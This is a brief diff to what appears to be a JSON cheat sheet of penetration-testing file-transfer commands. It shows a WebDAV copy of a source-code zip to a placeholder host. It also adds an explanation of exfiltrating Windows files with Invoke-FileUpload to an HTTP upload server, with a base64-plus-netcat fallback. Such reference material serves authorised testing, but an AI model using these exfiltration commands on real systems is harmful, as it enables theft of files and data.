@@ -132,5 +132,6 @@
       "command": "copy C:\\Users\\john\\Desktop\\SourceCode.zip \\\\<ip>\\DavWWWRoot\\",
       "label": "WebDAV copy"
     }
-  ]
+  ],
+  "explain": "Exfiltrates a file from Windows to your box using the PSUpload helper:\n  Invoke-FileUpload -Uri http://<ip>:8000/upload   POST to a Python uploadserver\n  -File C:\\Windows\\System32\\drivers\\etc\\hosts       the file to send\nUploads the file over HTTP; when uploadserver is unavailable, base64-encode the file and POST the blob to a netcat listener instead."
 }
